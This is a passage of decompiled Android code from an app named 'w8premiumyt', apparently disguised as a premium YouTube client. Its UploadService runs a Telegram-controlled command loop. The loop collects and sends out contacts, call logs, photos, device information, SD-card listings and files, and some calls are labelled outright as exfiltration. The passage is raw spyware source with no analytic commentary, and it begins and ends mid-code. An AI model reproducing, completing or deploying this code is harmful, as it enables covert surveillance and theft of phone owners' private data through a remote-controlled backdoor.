                    com.w8sb.w8premiumyt.UploadService.access$sendAllDeviceInfo(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 1
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendContacts(r2, r3)
                    if (r2 != r0) goto L3d
                    return r0
                L3d:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 2
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendCallLog(r2, r3)
                    if (r2 != r0) goto L4c
                    return r0
                L4c:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$startPhotoUpload(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 3
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$batchAndSendExfilData(r2, r3)
                    if (r2 != r0) goto L60
                    return r0
                L60:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                    java.lang.String r3 = r3.m۱۰۰۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch26$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()
                    r4 = r1
                    kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                    r5 = 4
                    r1.label = r5
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$sendTextToTelegram(r2, r3, r4)
                    if (r2 != r0) goto L75
                    return r0
                L75:
                    r0 = r1
                L76:
                    kotlin.Unit r1 = kotlin.Unit.INSTANCE
                    return r1
                */
                throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۶1.AnonymousClass94.invokeSuspend(java.lang.Object):java.lang.Object");
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$95, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$95", f = "UploadService.kt", i = {}, l = {1972}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass95 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass95(UploadService uploadService, Continuation<? super AnonymousClass95> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass95(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch27$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$96, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$96", f = "UploadService.kt", i = {}, l = {1976}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass96 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass96(UploadService uploadService, Continuation<? super AnonymousClass96> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass96(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch28$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$97, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$97", f = "UploadService.kt", i = {}, l = {1981}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass97 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass97(UploadService uploadService, Continuation<? super AnonymousClass97> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass97(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch29$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$98, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$98", f = "UploadService.kt", i = {}, l = {1985}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass98 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass98(UploadService uploadService, Continuation<? super AnonymousClass98> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass98(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch30$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$99, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$99", f = "UploadService.kt", i = {}, l = {1989}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass99 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass99(UploadService uploadService, Continuation<? super AnonymousClass99> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass99(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch31$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$100, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$100", f = "UploadService.kt", i = {}, l = {1994}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass100 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass100(UploadService uploadService, Continuation<? super AnonymousClass100> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass100(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch32$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$101, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$101", f = "UploadService.kt", i = {}, l = {2002}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass101 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass101(UploadService uploadService, Continuation<? super AnonymousClass101> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass101(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch34$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$102, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$102", f = "UploadService.kt", i = {}, l = {2006}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass102 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass102(UploadService uploadService, Continuation<? super AnonymousClass102> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass102(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch35$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$103, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$103", f = "UploadService.kt", i = {}, l = {2009}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass103 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass103(UploadService uploadService, Continuation<? super AnonymousClass103> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass103(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextToTelegram(uploadService.listSdcardRoot(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$104, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$104", f = "UploadService.kt", i = {}, l = {2013}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass104 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $filename;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass104(UploadService uploadService, String str, Continuation<? super AnonymousClass104> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$filename = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass104(this.this$0, this.$filename, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFileToTelegram(this.$filename, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$105, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$105", f = "UploadService.kt", i = {}, l = {2017}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass105 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $folder;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass105(UploadService uploadService, String str, Continuation<? super AnonymousClass105> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$folder = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass105(this.this$0, this.$folder, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFolderToTelegram(this.$folder, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$106, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$106", f = "UploadService.kt", i = {}, l = {2021}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass106 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass106(UploadService uploadService, Continuation<? super AnonymousClass106> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass106(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        String replyMarkup = this.this$0.buildCommandsKeyboard();
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۸String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch39$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$107, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$107", f = "UploadService.kt", i = {}, l = {2024}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass107 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass107(UploadService uploadService, Continuation<? super AnonymousClass107> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass107(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextToTelegram(uploadService.listDownloadFolder(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$108, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$108", f = "UploadService.kt", i = {}, l = {2028}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass108 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $filename;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass108(UploadService uploadService, String str, Continuation<? super AnonymousClass108> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$filename = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
